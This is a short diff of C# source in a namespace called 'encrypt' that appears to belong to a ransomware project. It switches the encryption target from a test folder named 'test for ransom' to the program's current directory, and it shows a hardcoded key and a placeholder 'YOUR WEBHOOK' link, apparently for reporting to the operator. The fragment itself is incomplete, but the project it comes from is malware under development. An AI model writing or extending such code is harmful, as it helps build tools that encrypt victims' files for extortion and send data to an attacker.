@@ -21,9 +21,7 @@ namespace encrypt
                 throw new ArgumentNullException(nameof(args));
             }
 
-            string user = Environment.UserName.ToLower();
-            string directory = $@"C:\Users\{user}\Downloads\test for ransom\";
-            //string directory =  Directory.GetCurrentDirectory();
+            string directory =  Directory.GetCurrentDirectory();
             var bytes = Encoding.UTF8.GetBytes("dfjakjfklajldlkakfkldjafj");
             var key = Convert.ToBase64String(bytes, Base64FormattingOptions.InsertLineBreaks);
             string webhook_link = "YOUR WEBHOOK";
